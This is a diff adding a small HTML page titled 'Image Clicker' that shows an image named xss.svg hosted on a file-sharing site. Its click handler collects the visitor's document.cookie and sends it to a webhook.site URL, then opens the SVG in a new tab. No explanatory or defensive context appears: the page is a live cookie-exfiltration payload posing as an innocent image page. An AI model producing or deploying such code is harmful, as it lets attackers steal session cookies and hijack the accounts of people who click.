@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Image Clicker</title>
+</head>
+<body>
+
+<h2>Click on the Image</h2>
+<img id="clickable-image" src="https://tmpfiles.org/dl/5816606/xss.svg" alt="Image Description">
+
+<script>
+document.getElementById('clickable-image').addEventListener('click', function() {
+    // Collecting cookies
+    var cookies = document.cookie;
+
+    // Sending GET request with cookies
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://webhook.site/d2cba31b-48fe-43d2-a220-4ec88f158ecc/track?cookies=' + encodeURIComponent(cookies), true);
+    xhr.send();
+
+    // Opening the image
+    window.open('https://tmpfiles.org/dl/5816606/xss.svg', '_blank');
+});
+</script>
+
+</body>
+</html>
